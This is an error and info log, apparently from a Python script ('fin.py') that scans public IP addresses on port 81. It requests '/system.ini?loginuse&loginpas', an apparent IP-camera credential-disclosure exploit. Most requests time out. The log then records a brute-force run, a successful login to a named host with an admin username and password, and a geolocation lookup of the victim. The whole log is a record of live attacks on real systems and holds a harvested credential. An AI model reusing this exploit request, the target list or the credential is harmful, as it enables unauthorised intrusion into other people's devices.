+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 392, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 950, in send
+    self.connect()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 187, in connect
+    conn = self._new_conn()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 164, in _new_conn
+    raise ConnectTimeoutError(
+urllib3.exceptions.ConnectTimeoutError: (<urllib3.connection.HTTPConnection object at 0x000000E3DEFCC940>, 'Connection to 47.253.113.46 timed out. (connect timeout=10)')
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 446, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='47.253.113.46', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000E3DEFCC940>, 'Connection to 47.253.113.46 timed out. (connect timeout=10)'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 504, in send
+    raise ConnectTimeout(e, request=request)
+requests.exceptions.ConnectTimeout: HTTPConnectionPool(host='47.253.113.46', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000E3DEFCC940>, 'Connection to 47.253.113.46 timed out. (connect timeout=10)'))
+
+ERROR:root:[2023-04-25 21:47:45.291163]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 426, in _make_request
+    six.raise_from(e, None)
+  File "<string>", line 3, in raise_from
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 421, in _make_request
+    httplib_response = conn.getresponse()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1347, in getresponse
+    response.begin()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 307, in begin
+    version, status, reason = self._read_status()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 268, in _read_status
+    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 410, in increment
+    raise six.reraise(type(error), error, _stacktrace)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\packages\six.py", line 735, in reraise
+    raise value
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 428, in _make_request
+    self._raise_timeout(err=e, url=url, timeout_value=read_timeout)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 335, in _raise_timeout
+    raise ReadTimeoutError(
+urllib3.exceptions.ReadTimeoutError: HTTPConnectionPool(host='8.209.126.81', port=81): Read timed out. (read timeout=10)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 529, in send
+    raise ReadTimeout(e, request=request)
+requests.exceptions.ReadTimeout: HTTPConnectionPool(host='8.209.126.81', port=81): Read timed out. (read timeout=10)
+
+ERROR:root:[2023-04-25 21:47:58.026082]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 159, in _new_conn
+    conn = connection.create_connection(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 84, in create_connection
+    raise err
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 74, in create_connection
+    sock.connect(sa)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 392, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 950, in send
+    self.connect()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 187, in connect
+    conn = self._new_conn()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 164, in _new_conn
+    raise ConnectTimeoutError(
+urllib3.exceptions.ConnectTimeoutError: (<urllib3.connection.HTTPConnection object at 0x000000E3DEFD9430>, 'Connection to 98.57.10.101 timed out. (connect timeout=10)')
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 446, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='98.57.10.101', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000E3DEFD9430>, 'Connection to 98.57.10.101 timed out. (connect timeout=10)'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 504, in send
+    raise ConnectTimeout(e, request=request)
+requests.exceptions.ConnectTimeout: HTTPConnectionPool(host='98.57.10.101', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000E3DEFD9430>, 'Connection to 98.57.10.101 timed out. (connect timeout=10)'))
+
+INFO:root:[2023-04-25 21:48:04.374672]: Bruteforce started.
+
+INFO:root:[2023-04-25 21:48:14.997280]: Accessed: 93.14.78.249 ('admin', 'Ouffyy6407')
+
+INFO:geocoder.base:Requested http://ipinfo.io/93.14.78.249/json
+INFO:root:[2023-04-25 21:48:15.253726]: Shutdown
+
